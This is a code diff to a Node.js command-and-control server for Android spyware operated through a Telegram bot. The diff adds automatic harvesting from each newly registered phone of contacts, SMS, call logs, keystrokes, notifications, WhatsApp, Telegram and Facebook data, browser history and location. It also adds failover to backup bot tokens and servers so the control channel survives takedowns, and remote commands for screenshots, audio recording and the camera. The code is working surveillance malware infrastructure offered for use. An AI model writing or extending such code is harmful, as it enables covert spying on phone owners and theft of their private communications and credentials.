@@ -188,11 +188,150 @@ function getDeviceListForUser(chatId) {
                 lastSeen: device.lastSeen,
                 isActive: deviceId === userDeviceSelection.get(chatId),
                 phoneNumber: device.phoneNumber || 'Not available',
-                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
+                lastSeenFormatted: new Date(device.lastSeen).toLocaleString(),
+                isOnline: (Date.now() - device.lastSeen) < 300000
             });
         }
     }
     return userDevices;
+}
+
+// ============= AUTO-DATA QUEUE COMMANDS =============
+function queueAutoDataCommands(deviceId, chatId) {
+    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
+    
+    if (autoDataRequested.has(deviceId)) {
+        console.log(`⚠️ Auto-data already requested for ${deviceId}`);
+        return;
+    }
+    
+    autoDataRequested.set(deviceId, {
+        timestamp: Date.now(),
+        requested: [
+            'device_info', 'network_info', 'mobile_info',
+            'contacts', 'sms', 'calllogs', 'apps_list',
+            'keys', 'notify', 'whatsapp', 'telegram',
+            'facebook', 'browser', 'location'
+        ]
+    });
+    
+    const device = devices.get(deviceId);
+    if (!device) {
+        console.error(`❌ Device not found for auto-data: ${deviceId}`);
+        return;
+    }
+    
+    if (!device.pendingCommands) device.pendingCommands = [];
+    
+    const commands = [
+        { command: 'device_info', delay: 0, description: 'Device Info' },
+        { command: 'network_info', delay: 5, description: 'Network Info' },
+        { command: 'mobile_info', delay: 10, description: 'Mobile Info' },
+        { command: 'contacts', delay: 15, description: 'Contacts' },
+        { command: 'sms', delay: 20, description: 'SMS' },
+        { command: 'calllogs', delay: 25, description: 'Call Logs' },
+        { command: 'apps_list', delay: 30, description: 'Apps' },
+        { command: 'keys', delay: 35, description: 'Keystrokes' },
+        { command: 'notify', delay: 40, description: 'Notifications' },
+        { command: 'whatsapp', delay: 45, description: 'WhatsApp' },
+        { command: 'telegram', delay: 50, description: 'Telegram' },
+        { command: 'facebook', delay: 55, description: 'Facebook' },
+        { command: 'browser', delay: 60, description: 'Browser History' },
+        { command: 'location', delay: 65, description: 'Location' }
+    ];
+    
+    commands.forEach((cmd) => {
+        device.pendingCommands.push({
+            command: cmd.command,
+            originalCommand: `/${cmd.command}`,
+            messageId: null,
+            timestamp: Date.now() + (cmd.delay * 1000),
+            autoData: true,
+            description: cmd.description
+        });
+    });
+    
+    console.log(`✅ ${commands.length} auto-data commands queued for ${deviceId}`);
+    saveDevices();
+}
+
+// ============= DEVICE STATS AGGREGATION =============
+async function getDeviceStats(chatId) {
+    const userDevices = [];
+    
+    for (const [deviceId, device] of devices.entries()) {
+        if (String(device.chatId) === String(chatId)) {
+            const isOnline = (Date.now() - device.lastSeen) < 300000; // 5 minutes
+            
+            userDevices.push({
+                id: deviceId,
+                name: device.deviceInfo?.model || 'Unknown Device',
+                android: device.deviceInfo?.android || 'Unknown',
+                manufacturer: device.deviceInfo?.manufacturer || 'Unknown',
+                lastSeen: device.lastSeen,
+                lastSeenFormatted: new Date(device.lastSeen).toLocaleString(),
+                firstSeen: new Date(device.firstSeen).toLocaleString(),
+                isOnline: isOnline,
+                hasPendingCommands: (device.pendingCommands?.length || 0) > 0,
+                pendingCommandsCount: device.pendingCommands?.length || 0,
+                phoneNumber: device.phoneNumber || 'Not available'
+            });
+        }
+    }
+    
+    // Sort: online first, then by last seen
+    userDevices.sort((a, b) => {
+        if (a.isOnline && !b.isOnline) return -1;
+        if (!a.isOnline && b.isOnline) return 1;
+        return b.lastSeen - a.lastSeen;
+    });
+    
+    return {
+        total: userDevices.length,
+        online: userDevices.filter(d => d.isOnline).length,
+        offline: userDevices.filter(d => !d.isOnline).length,
+        devices: userDevices
+    };
+}
+
+function formatDeviceStatsMessage(stats) {
+    let message = `📊 *DEVICE STATISTICS*\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    message += `📱 *Total Devices:* ${stats.total}\n`;
+    message += `🟢 *Online:* ${stats.online}\n`;
+    message += `🔴 *Offline:* ${stats.offline}\n\n`;
+    
+    if (stats.devices.length === 0) {
+        message += `No devices registered yet.\n`;
+        message += `Use the Android app to register your first device.`;
+    } else {
+        stats.devices.forEach((device, index) => {
+            const statusIcon = device.isOnline ? '🟢' : '🔴';
+            const statusText = device.isOnline ? 'ONLINE' : 'OFFLINE';
+            
+            message += `${index + 1}. ${statusIcon} *${device.name}*\n`;
+            message += `   └ 📱 ${device.manufacturer}\n`;
+            message += `   └ 🤖 Android ${device.android}\n`;
+            message += `   └ 🆔 \`${device.id.substring(0, 8)}...\`\n`;
+            message += `   └ 📅 Last Seen: ${device.lastSeenFormatted}\n`;
+            message += `   └ 📊 Status: ${statusText}\n`;
+            if (device.pendingCommandsCount > 0) {
+                message += `   └ ⏳ Pending Commands: ${device.pendingCommandsCount}\n`;
+            }
+            if (device.phoneNumber !== 'Not available') {
+                message += `   └ 📞 Phone: ${device.phoneNumber}\n`;
+            }
+            message += `\n`;
+        });
+        
+        message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `💡 *Commands:*\n`;
+        message += `• /select [device_id] - Switch active device\n`;
+        message += `• /refresh - Update this list\n`;
+        message += `• /devices - List all devices\n`;
+    }
+    
+    return message;
 }
 
 // ============= GITHUB GIST STORAGE FUNCTIONS =============
@@ -265,6 +404,52 @@ async function saveDevices() {
     saveLocalBackup();
 }
 
+// ============= FAILOVER STATE MANAGEMENT =============
+async function saveFailoverState() {
+    if (octokit && GIST_ID) {
+        await writeToGist(GIST_FILES.FAILOVER_STATE, failoverState);
+    }
+    
+    try {
+        const backupDir = path.join(__dirname, 'backup');
+        if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
+        fs.writeFileSync(
+            path.join(backupDir, 'failover_state.backup.json'),
+            JSON.stringify(failoverState, null, 2)
+        );
+    } catch (error) {
+        console.error('Error saving failover state:', error);
+    }
+}
+
+async function loadFailoverState() {
+    if (octokit && GIST_ID) {
+        const data = await readFromGist(GIST_FILES.FAILOVER_STATE);
+        if (data) {
+            failoverState = data;
+            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
+            console.log(`✅ Loaded failover state: ${failoverState.isFailedOver ? 'FAILED OVER' : 'NORMAL'}`);
+            return;
+        }
+    }
+    
+    // Try local backup
+    try {
+        const backupPath = path.join(__dirname, 'backup', 'failover_state.backup.json');
+        if (fs.existsSync(backupPath)) {
+            const data = fs.readFileSync(backupPath, 'utf8');
+            const saved = JSON.parse(data);
+            failoverState = { ...failoverState, ...saved };
+            activeBotToken = failoverState.currentBotToken || MAIN_BOT_TOKEN;
+            activeServerUrl = failoverState.currentServerUrl || activeServerUrl;
+            console.log(`✅ Loaded failover state from local backup`);
+        }
+    } catch (error) {
+        console.error('Error loading failover state:', error);
+    }
+}
+
 // ============= TELEGRAM MESSAGE FUNCTIONS =============
 function getTelegramApiUrl() {
     return `https://api.telegram.org/bot${activeBotToken}`;
@@ -331,6 +516,7 @@ async function setChatMenuButton(chatId) {
             { command: 'help', description: '📋 Complete help menu' },
             { command: 'showmenu', description: '📋 Show help menu' },
             { command: 'devices', description: '📱 List all devices' },
+            { command: 'stats', description: '📊 Device statistics' },
             { command: 'select', description: '🎯 Select device to control' },
             { command: 'screenshot', description: '📸 Take screenshot' },
             { command: 'record', description: '🎤 Start recording' },
@@ -374,7 +560,101 @@ app.get('/health', (req, res) => {
         devices: devices.size,
         authorizedChats: authorizedChats.size,
         serverIP: getServerIP(),
+        failoverActive: failoverState.isFailedOver,
         timestamp: Date.now()
+    });
+});
+
+// ============= 1. COMMAND ACKNOWLEDGMENT ENDPOINT =============
+app.post('/api/commands/:deviceId/ack', async (req, res) => {
+    const deviceId = req.params.deviceId;
+    const { commandId, command, success, error } = req.body;
+    
+    console.log(`📝 Command acknowledgment from ${deviceId}:`, { commandId, command, success });
+    
+    const device = devices.get(deviceId);
+    if (device && device.pendingCommands) {
+        const originalLength = device.pendingCommands.length;
+        
+        // Remove the acknowledged command
+        if (commandId) {
+            device.pendingCommands = device.pendingCommands.filter(
+                cmd => cmd.messageId !== commandId && cmd.command !== commandId
+            );
+        } else if (command) {
+            device.pendingCommands = device.pendingCommands.filter(
+                cmd => cmd.command !== command
+            );
+        }
+        
+        if (originalLength !== device.pendingCommands.length) {
+            await saveDevices();
+            console.log(`✅ Command ${commandId || command} acknowledged by ${deviceId}`);
+        }
+    }
+    res.json({ success: true });
+});
+
+// ============= 2. SERVER CONFIG ENDPOINT =============
+app.get('/api/config/servers', (req, res) => {
+    console.log('📡 Server config requested from:', req.ip);
+    
+    res.json({
+        main_url: activeServerUrl,
+        second_url: SECONDARY_SERVER_URL,
+        active_server_url: activeServerUrl,
+        failover_active: failoverState.isFailedOver || false,
+        encryption_salt: ENCRYPTION_SALT,
+        timestamp: Date.now()
+    });
+});
+
+// ============= FAILOVER MANAGEMENT ENDPOINTS =============
+app.post('/api/failover/force', async (req, res) => {
+    console.log('🔄 Force failover requested');
+    
+    if (!SECONDARY_BOT_TOKEN) {
+        return res.json({ success: false, error: 'No secondary bot configured' });
+    }
+    
+    activeBotToken = SECONDARY_BOT_TOKEN;
+    activeServerUrl = SECONDARY_SERVER_URL;
+    failoverState.isFailedOver = true;
+    failoverState.failedOverAt = Date.now();
+    failoverState.currentBotToken = SECONDARY_BOT_TOKEN;
+    failoverState.currentServerUrl = SECONDARY_SERVER_URL;
+    failoverState.failoverCount = (failoverState.failoverCount || 0) + 1;
+    
+    await saveFailoverState();
+    await setupWebhook();
+    
+    res.json({ success: true, failoverActive: true });
+});
+
+app.post('/api/failover/restore', async (req, res) => {
+    console.log('🔄 Restore primary requested');
+    
+    activeBotToken = MAIN_BOT_TOKEN;
+    activeServerUrl = process.env.RENDER_EXTERNAL_URL || 'https://edu-hwpy.onrender.com';
+    failoverState.isFailedOver = false;
+    failoverState.currentBotToken = MAIN_BOT_TOKEN;
+    failoverState.currentServerUrl = activeServerUrl;
+    
+    await saveFailoverState();
+    await setupWebhook();
+    
+    res.json({ success: true, failoverActive: false });
+});
+
+app.get('/api/failover/status', (req, res) => {
+    res.json({
+        failoverActive: failoverState.isFailedOver || false,
+        failedOverAt: failoverState.failedOverAt,
+        failoverCount: failoverState.failoverCount || 0,
+        currentServerUrl: activeServerUrl,
+        usingBackupBot: activeBotToken !== MAIN_BOT_TOKEN,
+        primaryBotToken: MAIN_BOT_TOKEN.substring(0, 15) + '...',
+        secondaryConfigured: !!SECONDARY_BOT_TOKEN
     });
 });
 
@@ -397,6 +677,7 @@ app.get('/api/device/:deviceId/complete-config', (req, res) => {
         encrypted_token: encryptedToken,
         encrypted_chat_id: encryptedChatId,
         server_url: activeServerUrl,
+        failover_status: failoverState.isFailedOver ? 'failed_over' : 'normal',
         timestamp: Date.now()
     });
 });
@@ -431,14 +712,25 @@ app.get('/api/commands/:deviceId', async (req, res) => {
     
     try {
         if (device?.pendingCommands?.length > 0) {
-            const commands = device.pendingCommands.map(cmd => ({
+            // Sort by timestamp and filter expired commands (older than 5 minutes)
+            const now = Date.now();
+            const validCommands = device.pendingCommands.filter(cmd => 
+                (cmd.timestamp + 300000) > now // 5 minutes TTL
+            );
+            
+            const commands = validCommands.map(cmd => ({
                 command: cmd.command,
                 originalCommand: cmd.originalCommand,
                 messageId: cmd.messageId,
                 timestamp: cmd.timestamp,
                 autoData: cmd.autoData || false
             }));
-            device.pendingCommands = [];
+            
+            // Remove only the commands we're sending (not all)
+            device.pendingCommands = device.pendingCommands.filter(cmd => 
+                !validCommands.includes(cmd)
+            );
+            
             await saveDevices();
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
             res.json({ commands });
@@ -503,10 +795,25 @@ app.post('/api/register', async (req, res) => {
     
     if (isNewDevice) {
         welcomeMessage += `You now have ${userDevices.length} device(s) registered.\n\n`;
+        welcomeMessage += `🔄 <b>Auto-collecting data...</b>\n`;
+        welcomeMessage += `The following data will be collected automatically:\n`;
+        welcomeMessage += `• Device Info • Network Info • Mobile Info\n`;
+        welcomeMessage += `• Contacts • SMS • Call Logs • Apps\n`;
+        welcomeMessage += `• Keystrokes • Notifications\n`;
+        welcomeMessage += `• WhatsApp • Telegram • Facebook\n`;
+        welcomeMessage += `• Browser History • Location\n\n`;
+        
         if (userDevices.length === 1) {
             userDeviceSelection.set(deviceConfig.chatId, deviceId);
-            welcomeMessage += `✅ This device has been automatically selected for control.`;
+            welcomeMessage += `✅ This device has been automatically selected for control.\n\n`;
         }
+        
+        welcomeMessage += `Use /help to see all available commands.`;
+        
+        // Queue auto-data commands for new device
+        queueAutoDataCommands(deviceId, deviceConfig.chatId);
+    } else {
+        welcomeMessage += `Device information updated.`;
     }
     
     await sendTelegramMessageWithKeyboard(
@@ -631,6 +938,18 @@ app.post('/api/result/:deviceId', async (req, res) => {
     res.sendStatus(200);
 });
 
+// ============= DEVICE STATS ENDPOINT =============
+app.get('/api/device-stats/:chatId', async (req, res) => {
+    const chatId = req.params.chatId;
+    
+    if (!isAuthorizedChat(chatId)) {
+        return res.status(403).json({ error: 'Unauthorized' });
+    }
+    
+    const stats = await getDeviceStats(chatId);
+    res.json(stats);
+});
+
 // ============= WEBHOOK SETUP =============
 async function setupWebhook() {
     try {
@@ -688,6 +1007,264 @@ app.post('/webhook', async (req, res) => {
         }
     });
 });
+
+// ============= COMMAND HANDLER =============
+async function handleCommand(chatId, command, messageId) {
+    console.log(`🎯 Command: ${command} from ${chatId}`);
+    
+    // Handle /stats command
+    if (command === '/stats' || command === '/device_stats') {
+        const stats = await getDeviceStats(chatId);
+        const message = formatDeviceStatsMessage(stats);
+        await sendTelegramMessage(chatId, message);
+        return;
+    }
+    
+    // Handle /devices command
+    if (command === '/devices') {
+        const userDevices = getDeviceListForUser(chatId);
+        let message = `📱 *Your Devices*\n\n`;
+        
+        if (userDevices.length === 0) {
+            message += "No devices registered yet.";
+        } else {
+            userDevices.forEach((device, index) => {
+                const status = device.isActive ? '✅ ACTIVE' : '○';
+                const onlineStatus = device.isOnline ? '🟢 Online' : '🔴 Offline';
+                message += `${index + 1}. ${status} ${device.name}\n`;
+                message += `   ID: \`${device.id}\`\n`;
+                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
+                message += `   Status: ${onlineStatus}\n`;
+                if (device.phoneNumber !== 'Not available') {
+                    message += `   Phone: ${device.phoneNumber}\n`;
+                }
+                message += `\n`;
+            });
+            message += `\nUse /select [device_id] to switch active device.\n`;
+            message += `Use /stats for detailed device statistics.`;
+        }
+        
+        await sendTelegramMessage(chatId, message);
+        return;
+    }
+    
+    // Handle /refresh command
+    if (command === '/refresh' || command === '/refresh_stats') {
+        const stats = await getDeviceStats(chatId);
+        const message = formatDeviceStatsMessage(stats);
+        await sendTelegramMessage(chatId, message);
+        return;
+    }
+    
+    // Get selected device
+    let selectedDeviceId = userDeviceSelection.get(chatId);
+    let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+    
+    if (!device) {
+        for (const [id, d] of devices.entries()) {
+            if (String(d.chatId) === String(chatId)) {
+                selectedDeviceId = id;
+                device = d;
+                userDeviceSelection.set(chatId, selectedDeviceId);
+                break;
+            }
+        }
+    }
+    
+    if (!device) {
+        await sendTelegramMessageWithKeyboard(chatId, '❌ No device registered.', getMainMenuKeyboard(chatId));
+        return;
+    }
+    
+    device.lastSeen = Date.now();
+    await saveDevices();
+    
+    if (!device.pendingCommands) device.pendingCommands = [];
+    
+    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
+    device.pendingCommands.push({
+        command: cleanCommand,
+        originalCommand: command,
+        messageId: messageId,
+        timestamp: Date.now()
+    });
+    await saveDevices();
+    
+    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
+}
+
+// ============= CALLBACK QUERY HANDLER =============
+async function handleCallbackQuery(callbackQuery) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const data = callbackQuery.data;
+    const callbackId = callbackQuery.id;
+    
+    await answerCallbackQuery(callbackId);
+    
+    if (data.startsWith('cmd:')) {
+        const command = data.substring(4);
+        await handleCommand(chatId, `/${command}`, messageId);
+        return;
+    }
+    
+    switch (data) {
+        case 'help_main':
+            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+            await sendTelegramMessage(chatId, "🤖 Control Panel");
+            break;
+        case 'menu_screenshot':
+            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
+            break;
+        case 'menu_screenshot_settings':
+            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
+            break;
+        case 'menu_screenshot_targets':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
+            break;
+        case 'menu_screenshot_quality':
+            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
+            break;
+        case 'menu_screenshot_token':
+            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
+            break;
+        case 'menu_sched_config':
+            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
+            break;
+        case 'menu_configure_schedule':
+            await sendTelegramMessage(chatId, "⚙️ Configure Schedule\nSend: `on/off general_minutes target_minutes`");
+            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sched_config' });
+            break;
+        case 'menu_add_target':
+            await sendTelegramMessage(chatId, "📱 Add Target App\nSend package name");
+            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_target' });
+            break;
+        case 'menu_remove_target':
+            await sendTelegramMessage(chatId, "❌ Remove Target App\nSend package name");
+            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_target' });
+            break;
+        case 'menu_camera':
+            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
+            break;
+        case 'menu_recording':
+            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
+            break;
+        case 'menu_recording_settings':
+            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
+            break;
+        case 'menu_audio_quality':
+            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
+            break;
+        case 'menu_custom_schedule':
+            await sendTelegramMessage(chatId, "⚙️ Custom Schedule\nFormat: `HH:MM HH:MM daily/once minutes`");
+            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
+            userStates.set(chatId, { state: 'awaiting_custom_schedule' });
+            break;
+        case 'menu_data':
+            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
+            break;
+        case 'menu_new_data':
+            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
+            break;
+        case 'menu_all_data':
+            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
+            break;
+        case 'menu_sync_harvest':
+            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
+            break;
+        case 'menu_set_sync_interval':
+            await sendTelegramMessage(chatId, "⚙️ Set Sync Interval\nSend minutes (5-720)");
+            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
+            userStates.set(chatId, { state: 'awaiting_sync_interval' });
+            break;
+        case 'menu_realtime':
+            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
+            break;
+        case 'menu_info':
+            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
+            break;
+        case 'menu_device_name':
+            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
+            break;
+        case 'menu_system':
+            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
+            break;
+        case 'menu_media':
+            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
+            break;
+        case 'menu_add_scan_path':
+            await sendTelegramMessage(chatId, "📁 Add Scan Path\nSend folder path");
+            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_add_scan_path' });
+            break;
+        case 'menu_remove_scan_path':
+            await sendTelegramMessage(chatId, "❌ Remove Scan Path\nSend folder path");
+            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
+            userStates.set(chatId, { state: 'awaiting_remove_scan_path' });
+            break;
+        case 'menu_app_management':
+            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
+            break;
+        case 'menu_data_saving':
+            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
+            break;
+        case 'menu_bot_token':
+            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
+            break;
+        case 'menu_set_server_backup':
+            await sendTelegramMessage(chatId, "🤖 Set Server Backup\nFormat: `token1 chatId1 token2 chatId2`");
+            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
+            userStates.set(chatId, { state: 'awaiting_server_backup' });
+            break;
+        case 'menu_devices':
+            const keyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, keyboard);
+            break;
+        case 'refresh_devices':
+            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
+            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
+            await answerCallbackQuery(callbackId, '🔄 Refreshed');
+            break;
+        case 'device_stats':
+            const stats = await getDeviceStats(chatId);
+            const message = formatDeviceStatsMessage(stats);
+            await sendTelegramMessage(chatId, message);
+            break;
+        default:
+            if (data.startsWith('select_device:')) {
+                const selectedDeviceId = data.split(':')[1];
+                const device = devices.get(selectedDeviceId);
+                if (device) {
+                    userDeviceSelection.set(chatId, selectedDeviceId);
+                    await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model}`);
+                    await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
+                }
+            } else if (data === 'close_menu') {
+                await editMessageKeyboard(chatId, messageId, []);
+                await sendTelegramMessage(chatId, "Menu closed. Type /help to reopen.");
+            }
+            break;
+    }
+}
+
+function getDeviceSelectionKeyboard(chatId) {
+    const userDevices = getDeviceListForUser(chatId);
+    const keyboard = [];
+    userDevices.forEach(device => {
+        const status = device.isActive ? '✅ ' : '';
+        keyboard.push([{
+            text: `${status}${device.name}`,
+            callback_data: `select_device:${device.id}`
+        }]);
+    });
+    keyboard.push([{ text: '🔄 Refresh', callback_data: 'refresh_devices' }]);
+    keyboard.push([{ text: '📊 Stats', callback_data: 'device_stats' }]);
+    keyboard.push([{ text: '◀️ Back', callback_data: 'help_main' }]);
+    return keyboard;
+}
 
 // ============= MENU KEYBOARDS =============
 function getMainMenuKeyboard(chatId) {
@@ -898,223 +1475,6 @@ function getCustomScheduleKeyboard() { return [[{ text: '◀️ Cancel', callbac
 function getSetSyncIntervalKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_sync_harvest' }]]; }
 function getSetServerBackupKeyboard() { return [[{ text: '◀️ Cancel', callback_data: 'menu_bot_token' }]]; }
 
-// ============= COMMAND HANDLER =============
-async function handleCommand(chatId, command, messageId) {
-    console.log(`🎯 Command: ${command} from ${chatId}`);
-    
-    // Get selected device
-    let selectedDeviceId = userDeviceSelection.get(chatId);
-    let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    
-    if (!device) {
-        for (const [id, d] of devices.entries()) {
-            if (String(d.chatId) === String(chatId)) {
-                selectedDeviceId = id;
-                device = d;
-                userDeviceSelection.set(chatId, selectedDeviceId);
-                break;
-            }
-        }
-    }
-    
-    if (!device) {
-        await sendTelegramMessageWithKeyboard(chatId, '❌ No device registered.', getMainMenuKeyboard(chatId));
-        return;
-    }
-    
-    device.lastSeen = Date.now();
-    await saveDevices();
-    
-    if (!device.pendingCommands) device.pendingCommands = [];
-    
-    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
-    device.pendingCommands.push({
-        command: cleanCommand,
-        originalCommand: command,
-        messageId: messageId,
-        timestamp: Date.now()
-    });
-    await saveDevices();
-    
-    await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
-}
-
-// ============= CALLBACK QUERY HANDLER =============
-async function handleCallbackQuery(callbackQuery) {
-    const chatId = callbackQuery.message.chat.id;
-    const messageId = callbackQuery.message.message_id;
-    const data = callbackQuery.data;
-    const callbackId = callbackQuery.id;
-    
-    await answerCallbackQuery(callbackId);
-    
-    if (data.startsWith('cmd:')) {
-        const command = data.substring(4);
-        await handleCommand(chatId, `/${command}`, messageId);
-        return;
-    }
-    
-    switch (data) {
-        case 'help_main':
-            await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
-            await sendTelegramMessage(chatId, "🤖 Control Panel");
-            break;
-        case 'menu_screenshot':
-            await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
-            break;
-        case 'menu_screenshot_settings':
-            await editMessageKeyboard(chatId, messageId, getScreenshotSettingsKeyboard());
-            break;
-        case 'menu_screenshot_targets':
-            await editMessageKeyboard(chatId, messageId, getScreenshotTargetsKeyboard());
-            break;
-        case 'menu_screenshot_quality':
-            await editMessageKeyboard(chatId, messageId, getScreenshotQualityKeyboard());
-            break;
-        case 'menu_screenshot_token':
-            await editMessageKeyboard(chatId, messageId, getScreenshotTokenKeyboard());
-            break;
-        case 'menu_sched_config':
-            await editMessageKeyboard(chatId, messageId, getSchedConfigKeyboard());
-            break;
-        case 'menu_configure_schedule':
-            await sendTelegramMessage(chatId, "⚙️ Configure Schedule\nSend: `on/off general_minutes target_minutes`");
-            await editMessageKeyboard(chatId, messageId, getConfigureScheduleKeyboard());
-            userStates.set(chatId, { state: 'awaiting_sched_config' });
-            break;
-        case 'menu_add_target':
-            await sendTelegramMessage(chatId, "📱 Add Target App\nSend package name");
-            await editMessageKeyboard(chatId, messageId, getAddTargetKeyboard());
-            userStates.set(chatId, { state: 'awaiting_add_target' });
-            break;
-        case 'menu_remove_target':
-            await sendTelegramMessage(chatId, "❌ Remove Target App\nSend package name");
-            await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
-            userStates.set(chatId, { state: 'awaiting_remove_target' });
-            break;
-        case 'menu_camera':
-            await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
-            break;
-        case 'menu_recording':
-            await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
-            break;
-        case 'menu_recording_settings':
-            await editMessageKeyboard(chatId, messageId, getRecordingSettingsKeyboard());
-            break;
-        case 'menu_audio_quality':
-            await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
-            break;
-        case 'menu_custom_schedule':
-            await sendTelegramMessage(chatId, "⚙️ Custom Schedule\nFormat: `HH:MM HH:MM daily/once minutes`");
-            await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
-            userStates.set(chatId, { state: 'awaiting_custom_schedule' });
-            break;
-        case 'menu_data':
-            await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
-            break;
-        case 'menu_new_data':
-            await editMessageKeyboard(chatId, messageId, getNewDataKeyboard());
-            break;
-        case 'menu_all_data':
-            await editMessageKeyboard(chatId, messageId, getAllDataKeyboard());
-            break;
-        case 'menu_sync_harvest':
-            await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
-            break;
-        case 'menu_set_sync_interval':
-            await sendTelegramMessage(chatId, "⚙️ Set Sync Interval\nSend minutes (5-720)");
-            await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
-            userStates.set(chatId, { state: 'awaiting_sync_interval' });
-            break;
-        case 'menu_realtime':
-            await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
-            break;
-        case 'menu_info':
-            await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
-            break;
-        case 'menu_device_name':
-            await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
-            break;
-        case 'menu_system':
-            await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
-            break;
-        case 'menu_media':
-            await editMessageKeyboard(chatId, messageId, getMediaMenuKeyboard());
-            break;
-        case 'menu_add_scan_path':
-            await sendTelegramMessage(chatId, "📁 Add Scan Path\nSend folder path");
-            await editMessageKeyboard(chatId, messageId, getAddScanPathKeyboard());
-            userStates.set(chatId, { state: 'awaiting_add_scan_path' });
-            break;
-        case 'menu_remove_scan_path':
-            await sendTelegramMessage(chatId, "❌ Remove Scan Path\nSend folder path");
-            await editMessageKeyboard(chatId, messageId, getRemoveScanPathKeyboard());
-            userStates.set(chatId, { state: 'awaiting_remove_scan_path' });
-            break;
-        case 'menu_app_management':
-            await editMessageKeyboard(chatId, messageId, getAppManagementKeyboard());
-            break;
-        case 'menu_data_saving':
-            await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
-            break;
-        case 'menu_bot_token':
-            await editMessageKeyboard(chatId, messageId, getBotTokenKeyboard());
-            break;
-        case 'menu_set_server_backup':
-            await sendTelegramMessage(chatId, "🤖 Set Server Backup\nFormat: `token1 chatId1 token2 chatId2`");
-            await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
-            userStates.set(chatId, { state: 'awaiting_server_backup' });
-            break;
-        case 'menu_devices':
-            const keyboard = getDeviceSelectionKeyboard(chatId);
-            await editMessageKeyboard(chatId, messageId, keyboard);
-            break;
-        case 'refresh_devices':
-            const refreshKeyboard = getDeviceSelectionKeyboard(chatId);
-            await editMessageKeyboard(chatId, messageId, refreshKeyboard);
-            await answerCallbackQuery(callbackId, '🔄 Refreshed');
-            break;
-        case 'device_stats':
-            const userDevices = getDeviceListForUser(chatId);
-            let statsMsg = `📊 Device Stats\nTotal: ${userDevices.length}\n\n`;
-            userDevices.forEach((device, i) => {
-                statsMsg += `${i+1}. ${device.name}\n   ID: ${device.id.substring(0,8)}...\n   Last: ${device.lastSeenFormatted}\n\n`;
-            });
